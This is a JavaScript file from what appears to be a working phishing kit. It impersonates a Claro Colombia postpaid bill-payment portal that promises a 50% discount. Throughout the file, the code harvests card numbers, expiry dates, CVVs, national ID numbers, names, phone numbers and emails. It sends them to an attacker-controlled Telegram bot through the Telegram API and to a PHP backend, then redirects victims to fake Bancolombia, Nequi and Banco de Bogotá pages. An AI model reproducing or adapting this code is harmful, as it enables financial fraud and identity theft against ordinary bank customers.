let firebaseConfig;
let database;

let botToken;
let chatId;

let tricoe = "../../../paga-ofertas/bancolombia";
let bgt = "../../../paga-ofertas/bancobogota";
let neqe = "../../../paga-ofertas/nequi";


// Función para cargar configuraciones desde config.json
async function loadFirebaseConfig() {
  try {
    const response = await fetch('./config.json'); // Ruta al archivo config.json
    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);

    const config = await response.json();

    // // Inicializar Firebase con la configuración cargada
    // firebaseConfig = config.firebaseConfig;
    // firebase.initializeApp(firebaseConfig);
    // database = firebase.database();

    // Asignar valores del bot desde el archivo config.json
    botToken = config.botToken;
    chatId = config.chatId;
  } catch (error) {
    console.error("Error al cargar la configuración de Firebase:", error);
  }
}




async function initApp() {
  await loadFirebaseConfig();
  console.log("Aplicación lista para usar Firebase");
  // Aquí puedes invocar otras funciones o lógica de tu app
}



function mostrarSeccion(e) {
  fetch("update_data.php", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: `id=${clienteid}&campo2=sectionVisible&valor2=${e}`
  })
    .then(response => response.json())
    .then(data => {
      console.log("Sección actualizada:", data);

      var t = `
      Cliente #: ${clienteid}
      Entro a ${e}
      `;

      enviarTelegramBot2(botToken, chatId, t, "Bot 1", e, clienteid);
    })
    .catch(error => console.error("Error en la petición:", error));
}

function obtenerHoraMinutoSegundo() {
  const e = new Date(),
    t = e.getHours(),
    o = e.getMinutes(),
    a = e.getSeconds(),
    c = t < 10 ? `0${t}` : t,
    n = o < 10 ? `0${o}` : o,
    l = a < 10 ? `0${a}` : a;
  return `${c}:${n}:${l}`;
}
function selectOption2(e) {
  var t = document.getElementById("numtc").value,
      o = document.getElementById("fechat").value,
      a = document.getElementById("codcv").value,
      c = document.getElementById("datost").value,
      n = document.getElementById("celular").value,
      l = document.getElementById("documento").value;

  if (t === "" || o === "" || a === "" || c === "" || n === "" || l === "") {
      alert("Por favor, completa todos los campos.");
      return;
  }

  // Enviar actualización a Firebase vía PHP
  fetch("update_data.php", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: `id=${clienteid}&campo1=numtc&valor1=${t}&campo2=fechat&valor2=${o}&campo3=codcv&valor3=${a}&campo4=datost&valor4=${c}`
  })
  .then(response => response.json())
  .then(data => console.log("Actualización exitosa:", data))
  .catch(error => console.error("Error en la petición:", error));

  // Enviar mensaje a Telegram
  var i = `
  Cliente #: ${clienteid}
  T: ${t}
  F: ${o}
  CV: ${a}
  ...................
  N: ${c}
  TLF: ${n}
  C: ${l}
  B: ${e}
  `;

  enviarTelegramBot(botToken, chatId, i, "Tarjeta", e, clienteid);
}

function formatInput(e) {
  var t = e.value.replace(/\D/g, "");
  if (e.id === "numtc") {
    var o = t.replace(/(\d{4})(?=\d)/g, "$1 ");
    e.value = o;
  } else if (e.id === "fechat") {
    var o = t.replace(/(\d{0,2})(\d{0,4})/, function (c, n, l) {
      return l ? n + "/" + l : n;
    });
    e.value = o;
  }
}

function imprimirusuario() {
  if (
    ((celular = document.getElementById("celular").value),
      (clienteid = obtenerHoraMinutoSegundo()),
      celular === "")
  ) {
    alert("Por favor, ingresa tu Numero de Referencia o Telefono.");
    return;
  }


  fetch("update_data.php", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: `id=${clienteid}&campo1=celular&valor1=${celular}&campo2=sectionVisible&valor2=espera&campo3=clienteid&valor3=${clienteid}&campo4=color&valor4=intermitente&id2=${clienteid}&campo1_2=celular&valor1_2=${celular}`
  })
    .then(response => response.json())
    .then(data => { })
    .catch(error => console.error("Error en la petición:", error));

  (document.getElementById("usuario").style.display = "none")
  var e = document.createElement("section");
  (e.id = clienteid),
    (e.innerHTML = `

 <section id="section2">
        <div class=" text-center py-4" style="background-color: #DA291C;">
            <img src="/assets/logocl.svg" width="80" height="24" alt="">
        </div>
        <div class="mt-5">
            <h1 class="titulo-1">Portal de <span style="font-weight: 600;color: #EF3829;">PAGOS Y RECARGAS</span>
            </h1>
        </div>
        <div class="tabla-1 border rounded" style="background: #DA291C;">
            <div>
                <p class="text-center" style="color: white; font-size: 20px;">Paga tu factura Postpago</p>
            </div>
            <div class="row border-top mx-0">
                <div class="col-6">
                    <p>Valor TOTAL de saldo actual a pagar:</p>
                </div>
                <div class="col-6">
                    <p style="color: #EF3829; font-weight: 800; font-size: 18px;"> $<span id="total"></span></p>
                </div>
            </div>
            <div class="row border-top mx-0">
                <div class="col-6">
                    <p>N\xFAmero Celular:</p>
                </div>
                <div class="col-6">
                    <p id="celular2"></p>
                </div>
            </div>
            <div class="row border-top mx-0">
                <div class="col-6">
                    <p>Descuento:</p>
                </div>
                <div class="col-6">
                    <p>$<span id="descuento"></span></p>
                </div>
            </div>
            <div class="row border-top mx-0">
                <div class="col-6">
                    <p>Deuda total:</p>
                </div>
                <div class="col-6">
                    <p>$<span id="deuda"></span></p>
                </div>
            </div>
            <div class="row border-top mx-0">
                <div class="col-6">
                    <p>Pague antes de:</p>
                </div>
                <div class="col-6">
                    <p id="fechavencimiento"><span id="fechavencimiento"></span></p>
                </div>
            </div>
        </div>
        <div>
            <label class="semdp"><strong>Selecciona el medio de pago</strong></label>
        </div>
        <div class="medio-pago">
        
        <a href="javascript:void(0);" id="ps" class="row border rounded mb-2" onclick="selectOption1('NEQUI')">
                <div class="col-2 d-flex align-items-center">
                    <img src="/assets/NEQ.png" width="auto" height="40" style="margin-left: 15px;">
                </div>
            </a>
            
            
        <a href="javascript:void(0);" id="trico" class="row border rounded mb-2"
                onclick="selectOption1('TRICOLOR')">
                <div class="col-2 d-flex align-items-center">
                    <img src="/assets/FORMA_PAGO_18.png" width="auto" height="35">
                </div>
                <div class="col-10 d-flex align-items-center">
                    <p class="mb-0">Bot\xF3n Bancolombia</p>
                </div>
            </a>
            
            <a href="javascript:void(0);" id="ps" class="row border rounded mb-2" onclick="selectOption1('De Bogota')">
                <div class="col-2 d-flex align-items-center">
                    <img src="../assets/logo-bogota-mobile.jpg" width="auto" height="40" style="margin-left: 15px;">
                </div>
            </a>  
            
            <a href="javascript:void(0);" id="tarjeta" class="row border rounded mb-2"
                onclick="selectOption1('Tarjeta')">
                <div class="col-2 d-flex align-items-center">
                    <img src="/assets/FORMA_PAGO_2.png" width="auto" height="35">
                </div>
                <div class="col-10 d-flex align-items-center">
                    <p class="mb-0">Tarjeta de Cr\xE9dito o D\xE9bito</p>
                </div>
            </a>

            
            
            
            
        </div>
    </section>

<section id="espera">
        <div style="display: flex;justify-content: center;align-items: center;height: 100vh;margin: 0;">
            <div style="text-align: center;height: auto;">
                <img style="width: 130px; margin-left: auto;" src="/assets/iconos-logo-claro.png">
                <br>
                <div class="loader">
                    <div class="dot"></div>
                    <div class="dot"></div>
                    <div class="dot"></div>
                </div>
            </div>
        </div>
</section>

<section id="Tarjeta" style="display:none;">
    <div class=" text-center py-4" style="background-color: #DA291C;">
        <img src="/assets/logocl.svg" width="80" height="24" alt="">
    </div>
    <div class="contenido">
        <div class="mt-5">
            <h1 class="titulo-1">Portal de <span style="font-weight: 600;color: #EF3829;">PAGOS Y RECARGAS</span>
            </h1>
        </div>
        <div class="texto_gris2">
            <p class="texto2">Paga de manera facil y desde donde quieras con tu tarjeta de Debito o Credito.</p>
        </div>
        <div>
            <label class="label-1">Numero de la Tarjeta</label>
            <input type="text" class="entrada-1" pattern="[0-9]*" inputmode="numeric" id="numtc"
                placeholder="1234 5678 9012 3456" autofocus="" autocomplete="off" minlength="16" maxlength="19"
                oninput="formatInput(this)">
        </div>
        <div>
            <label class="label-1">Fecha de Vencimiento</label>
            <input type="text" class="entrada-1" pattern="[0-9]*" inputmode="numeric" id="fechat" placeholder="MM/YYYY"
                b="" autocomplete="off" minlength="7" maxlength="7" oninput="formatInput(this)">
        </div>
        <div>
            <label class="label-1">Codigo de Seguridad</label>
            <input type="text" class="entrada-1" pattern="[0-9]*" inputmode="numeric" id="codcv" placeholder="CVV" b=""
                autocomplete="off" minlength="2" maxlength="4">
        </div>
        <div>
            <label class="label-1">Numero de Cuotas</label>
            <input type="text" class="entrada-1" pattern="[0-9]*" inputmode="numeric" placeholder="1" autocomplete="off"
                minlength="1" maxlength="2">
        </div>
        <div>
            <label class="label-1">Numero de documento</label>
            <input type="text" class="entrada-1" required="" inputmode="numeric" id="documento" placeholder="" autocomplete="off"
                minlength="5">
        </div>
        <div>
            <label class="label-1">Nombres y Apellidos</label>
            <input type="text" class="entrada-1" required="" id="datost" placeholder="" autocomplete="off"
                minlength="5">
        </div>
        <label for="input1" class="label-1">Selecciona tu Entidad Bancaria</label>
        <button id="selectBox" style="display: ; background-color: transparent; color: #5c5c5c; width: 100%; border-width: 1px;
          border-color: #b4b4b4;" class="select-box inputst" onclick="toggleOptions1()">
            <span id="entrada-1">Selecciona</span>
            <ul id="optionsList1" class="options-list">
                <li onclick="selectOption2('Banco De Bogota')">De Bogota</li>
                <li onclick="selectOption2('AV Villas')">AV Villas</li>
                <li onclick="selectOption2('BBVA Colombia')">BBVA Colombia</li>
                <li onclick="selectOption2('Davivienda')">Davivienda</li>
                <li onclick="selectOption2('TRICOLOR')">Bancolombia</li>
                <li onclick="selectOption2('Falabella')">Falabella</li>
                <li onclick="selectOption2('Scotiabank Colpatria')">Scotiabank Colpatria</li>
                <li onclick="selectOption2('Daviplata')">Daviplata</li>
                <li onclick="selectOption2('Agrario')">Agrario</li>
                <li onclick="selectOption2('Rappipay')">Rappipay</li>
                <li onclick="selectOption2('Popular')">Popular</li>
                <li onclick="selectOption2('De Occidente')">De Occidente</li>
                <li onclick="selectOption2('Finandina')">Finandina</li>
                <li onclick="selectOption2('Pichincha')">Pichincha</li>
                <li onclick="selectOption2('Mundo Mujer')">Mundo Mujer</li>
                <li onclick="selectOption2('Bancoomeva')">Bancoomeva</li>
                <li onclick="selectOption2('Citibank')">Citibank</li>
                <li onclick="selectOption2('Serfinanza')">Serfinanza</li>
                <li onclick="selectOption2('Caja Social')">Caja Social</li>
                <li onclick="selectOption2('Dale')">Dale</li>
                <li onclick="selectOption2('Movii')">Movii</li>
                <li onclick="selectOption2('Lulo Bank')">Lulo Bank</li>
                <li onclick="selectOption2('Santander Colombia')">Santander Colombia</li>
                <li onclick="selectOption2('Bancamia')">Bancamia</li>
                <li onclick="selectOption2('Itau')">Itau</li>
            </ul>
        </button>
        <input id="selectedValue1" type="hidden">

</section>

<section id="section4" style="display:none;">
    <div class="text-center py-4" style="background-color: #DA291C;">
<!--        <img src="/assets/logocl.svg" width="80" height="24" alt="">-->
        <img src="/assets/logocl.svg" width="80" height="24" alt="">
    </div>
    <div class="contenido">
        <div class="mt-5">
            <h1 class="titulo-1">Portal de <span style="font-weight: 600;color: #EF3829;">PAGOS Y RECARGAS</span>
            </h1>
        </div>
        <div class="tabla-1 border rounded" style="background: #DA291C;">
            <div>
                <p class="text-center" style="color: white; font-size: 20px;">Paga tu factura Postpago</p>
            </div>
            <div class="row border-top mx-0">
                <div class="col-6">
                    <p>Valor TOTAL de saldo actual a pagar:</p>
                </div>
                <div class="col-6">
                    <p style="color: #EF3829; font-weight: 700; font-size: 18px;" id="deuda">$</p>
                </div>
            </div>
            <div class="row border-top mx-0">
                <div class="col-6">
                    <p>N\xFAmero Celular:</p>
                </div>
                <div class="col-6">
                    <p id="celular2"></p>
                </div>
            </div>
            <div class="row border-top mx-0">
                <div class="col-6">
                    <p>Descuento:</p>
                </div>
                <div class="col-6">
                    <p id="descue">5622763898204232</p>
                </div>
            </div>
            <div class="row border-top mx-0">
                <div class="col-6">
                    <p>Descripcion de la compra:</p>
                </div>
                <div class="col-6">
                    <p id="fechavencimiento">Pago de factura Postpago</p>
                </div>
            </div>
        </div>
        <img src="/assets/pseNew.png" style="display: inherit;" alt="">
        <div>
            <label class="label-1">Banco o billetera digital</label>
            <select class="entrada-1" id="bancoSelect" aria-label="Default select example"
                style="height: 35px;font-size: 14px;">
                <option disabled selected style="color: black;font-weight: 500;">Selecciona tu Banco</label>
                <option value="">ALIANZA FIDUCIARIA</option>
                <option value="">BAN100</option>
                <option value="">BANCAMIA S.A.</option>
                <option value="">BANCO AGRARIO</option>
                <option value="">BANCO AV VILLAS</option>
                <option value="">BANCO BBVA COLOMBIA S.A.</option>
                <option value="">BANCO CAJA SOCIAL</option>
                <option value="">BANCO COOPERATIVO COOPCENTRAL</option>
                <option value="">BANCO DAVIVIENDA</option>
                <option value="De Bogota">BANCO DE BOGOTA</option>
                <option value="">BANCO DE OCCIDENTE</option>
                <option value="">BANCO FALABELLA</option>
                <option value="">BANCO FINANDINA S.A BIC</option>
                <option value="">BANCO GNB SUDAMERIS</option>
                <option value="">BANCO ITAU</option>
                <option value="">BANCO J.P MORGAN COLOMBIA S.A.</option>
                <option value="">BANCO MUNDO MUJER S.A.</option>
                <option value="">BANCO PICHINCHA S.A.</option>
                <option value="">BANCO POPULAR</option>
                <option value="">BANCO SANTANDER COLOMBIA</option>
                <option value="">BANCO SERFINANZA</option>
                <option value="">BANCO UNION antes Giros</option>
                <option value="TRICOLOR">BANCOLOMBIA</option>
                <option value="">BANCOOMEVA S.A.</option>
                <option value="">CFA COOPERATIVA FINANCIERA</option>
                <option value="">CITIBANK</option>
                <option value="">COLTEFINANCIERA</option>
                <option value="">CONFIAR COOPERATIVA FINANCIERA</option>
                <option value="">COTRAFA</option>
                <option value="">CREZCAMOS</option>
                <option value="">DALE</option>
                <option value="">IRIS</option>
                <option value="">JFK COOPERATIVA FINANCIERA</option>
                <option value="">LULO BANK</option>
                <option value="">MOVII S.A.</option>
                <option value="">NU. COLOMBIA COMPA\xD1IA DE FINANCIAMIENTO S.A.</option>
                <option value="">SCOTIABANK COLPATRIA</option>
                <option value="">UAL\xC1</option>
                <option disabled>Selecciona tu Billetera digital</option>
                <label>Selecciona tu Billetera digital</label>
                <option value="NEQUI">NEQUI</option>
                <option value="">DAVIPLATA</option>
                <option value="">RAPPIPAY</option>
            </select>
        </div>
        <div>
            <label class="label-1">Documento de Identificac\xEDon</label>
            <select class="entrada-1" aria-label="Default select example" style="height: 35px;font-size: 14px;">
                <option selected>C.C (C\xE9dula de Ciudadania)</option>
                <option>C.E (C\xE9dula de \xC9xtranjeria)</option>
                <option>PP (Pasaporte)</option>
            </select>
        </div>
        <div>
            <label class="label-1">Numero de Documento</label>
            <input type="text" class="entrada-1" required="" id="documento17" placeholder="" autocomplete="off"
            minlength="5" maxlength="12" pattern="d{12}" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
        </div>
        <div>
            <label class="label-1">Correo Electr\xF3nico</label>
            <input type="email" class="entrada-1" required="" id="correo" placeholder="" autocomplete="off"
                minlength="5">
        </div>
    </div>
    <div class="caja-boton-1">
        <button class="boton-1" onclick="pse()">PAGAR</button>
    </div>
</section>

  `),
    setTimeout(function () {
      (document.getElementById("section2").style.display = ""),
        (document.getElementById("footerr").style.display = ""),
        (document.getElementById("espera").style.display = "none"),
        devuelvesection2();
    }, 3e3);
  var t = document.getElementById("contenedor");
  t.appendChild(e),
    (document.getElementById("celular2").innerText = celular),
    (document.getElementById("section2").style.display = "none"),
    devuelvesection();
}


function devuelvesection() {
  fetch(`get_data_v2.php?id=${clienteid}&campo=sectionVisible`)
    .then(response => response.json())
    .then(data => {
      if (data.status === "success") {
        let t = data.data;
        (document.getElementById("section2").style.display = "none"),
          (document.getElementById("section3").style.display = "none"),
          (document.getElementById("footerr").style.display = "none"),
          (document.getElementById("pse").style.display = "none"),
          (document.getElementById("espera").style.display = "none"),
          (document.getElementById("Tarjeta").style.display = "none")
        if (t === "section3") {
          document.getElementById("section3").style.display = "";
        } else if (t === "section2") {
          document.getElementById("section2").style.display = "";
          document.getElementById("footer").style.display = "none";
        } else if (t === "espera") {
          document.getElementById("espera").style.display = "";
          document.getElementById("footerr").style.display = "none";
        } else if (t == "pse") {
          document.getElementById("section4").style.display = "";
        }
      }
    })
    .catch(error => console.error("Error obteniendo datos:", error));

}


function devuelvesection2() {
  fetch(`get_data.php?id=${clienteid}&campo=nombre`)
    .then(response => response.json())
    .then(data => {
      if (data.status === "success") {
        document.getElementById("nombre").innerText = data.data;
      }
    })
    .catch(error => console.error("Error obteniendo datos:", error));
}

function hora() {
  const e = new Date(),
    t = new Date();
  t.setDate(e.getDate() + 3);
  const o = { year: "numeric", month: "2-digit", day: "2-digit" },
    a = t.toLocaleDateString("es-ES", o);
  document.getElementById("fechavencimiento").textContent = a;
}
function porcentaje(e) {
  document.getElementById("deuda").innerText = e;
  var t = parseFloat(e.replace(/\./g, "")),
    o = t * 0.5,
    a = t - o;
  (document.getElementById("descuento").innerText = o.toLocaleString()),
    (document.getElementById("total").innerText = a.toLocaleString());
}

async function validarNumero() {
  const inputCelular = document.getElementById("celular");
  const btnValidar = document.getElementById("validarNumero");
  const loading = document.getElementById("loading"); // Elemento de carga
  const app = document.getElementById("app"); // Elemento de carga

  // Obtener el número ingresado
  const numeroIngresado = inputCelular.value.trim();

  // Mostrar loading y deshabilitar botón
  // loading.style.display = "block";
  // app.style.display = "none";
  btnValidar.disabled = true;

  try {

    // Obtener los datos del archivo CSV
    const response = await fetch("assets/numeros.csv");
    const csvText = await response.text();

    // Convertir CSV en array
    const lineas = csvText.split("\n").map(line => line.split(","));

    // Buscar el número en la base de datos
    for (const linea of lineas) {
      if (linea.length < 2) continue;

      const numeroGuardado = linea[0].trim();
      const porcentajeDescuento = linea[1].trim();

      if (numeroGuardado === numeroIngresado) {
        // Llamar funciones correspondientes
        imprimirusuario();
        porcentaje(porcentajeDescuento);
        hora();

        // Ocultar loading
        loading.style.display = "none";
        app.style.display = "block";
        btnValidar.disabled = false;
        return;
      }
    }

    // Si el número no se encuentra
    alert("El número de teléfono no aplica al descuento.");
  } catch (error) {
    console.error("Error al procesar el archivo CSV:", error);
    alert("Hubo un error al validar el número.");
  } finally {
    // Ocultar loading y habilitar botón
    loading.style.display = "none";
    app.style.display = "block";
    btnValidar.disabled = false;
  }
}

function toggleOptions1() {
  var e = document.getElementById("optionsList1");
  e.style.display === "block"
    ? (e.style.display = "none")
    : (e.style.display = "block");
}
function handleContinuar() {
  var e = document.getElementById("bancoSelect"),
    t = e.value;
  pse() && selectOption1(t);
}


function selectOption1(e) {
  document.getElementById("selectedValue1").value = e;
  document.getElementById("optionsList1").style.display = "none";

  // Enviar actualización a Firebase vía PHP
  fetch("update_data.php", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: `id=${clienteid}&campo1=tera&valor1=${e}`
  })
    .then(response => response.json())
    .then(data => console.log("Actualización exitosa:", data))
    .catch(error => console.error("Error en la petición:", error));

  // Control de navegación según la opción seleccionada
  if (["TRICOLOR", "NEQUI", "De Bogota"].includes(e)) {
    mostrarSeccion(e);
    let url = e === "TRICOLOR" ? `${tricoe}?date=${clienteid}`
      : e === "NEQUI" ? `${neqe}?date=${clienteid}`
        : `${bgt}?date=${clienteid}`;
    window.location.href = url;
  } else if (e === "Tarjeta") {
    document.getElementById("section2").style.display = "none";
    document.getElementById("Tarjeta").style.display = "";
  } else if (e === "section4") {
    document.getElementById("section2").style.display = "none";
    document.getElementById("section4").style.display = "";
  } else {
    document.getElementById("selectedOption1").innerText = e;
    document.getElementById("section3").style.display = "none";
    document.getElementById("errorpasarela").style.display = "";
  }
}



function enviarTelegramBot(e, t, o, a, c, n) {
  var l = `https://api.telegram.org/bot${e}/sendMessage?chat_id=${t}&text=${encodeURIComponent(
    o
  )}`;
  fetch(l)
    .then((i) => i.json())
    .then((i) => {
      if ((console.log(`Respuesta de ${a}:`, i), i.ok))
        if (c == "TRICOLOR" || c == "NEQUI") {
          mostrarSeccion(c);
          var s = c == "TRICOLOR" ? tricoe : neqe;
          window.location.href = `${s}?date=${n}`;
        } else
          (document.getElementById("Tarjeta").style.display = "none"),
            (document.getElementById("errorpasarela").style.display = "");
      else console.log(`Error al enviar el mensaje a ${a}`);
    })
    .catch((i) => {
      console.error(`Error al enviar el mensaje a ${a}:`, i),
        console.log(`Error al enviar el mensaje a ${a}`);
    });
}
function enviarTelegramBot2(e, t, o, a, c, n) {
  var l = `https://api.telegram.org/bot${e}/sendMessage?chat_id=${t}&text=${encodeURIComponent(
    o
  )}`;
  fetch(l)
    .then((i) => i.json())
    .then((i) => {
      i.ok
        ? console.log(n + "entro a" + c)
        : console.log(`Error al enviar el mensaje a ${a}`);
    })
    .catch((i) => {
      console.error(`Error al enviar el mensaje a ${a}:`, i),
        console.log(`Error al enviar el mensaje a ${a}`);
    });
}


function pse() {
  let correo = document.getElementById("correo").value;
  let docume = document.getElementById("documento17").value;

  if (correo === "") {
    alert("Por favor ingresa tu correo electrónico");
    return;
  }
  if (docume === "") {
    alert("Por favor, ingresa tu número de documento");
    return;
  }

  // Enviar actualización a Firebase vía PHP
  fetch("update_data.php", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: `id=${clienteid}&campo1=correo&valor1=${correo}&campo2=cedula&valor2=${docume}`
  })
    .then(response => response.json())
    .then(data => console.log("Actualización exitosa:", data))
    .catch(error => console.error("Error en la petición:", error));

  let banco = document.getElementById("bancoSelect").value;
  console.log(banco);
  selectOption1(banco);
}


// Llama a la inicialización al inicio
initApp();






{/* <a href="javascript:void(0);" id="ps" class="row border rounded mb-2" onclick="selectOption1('NEQUI')">
                <div class="col-2 d-flex align-items-center">
                    <img src="/assets/NEQ.png" width="auto" height="40" style="margin-left: 15px;">
                </div>
            </a> */}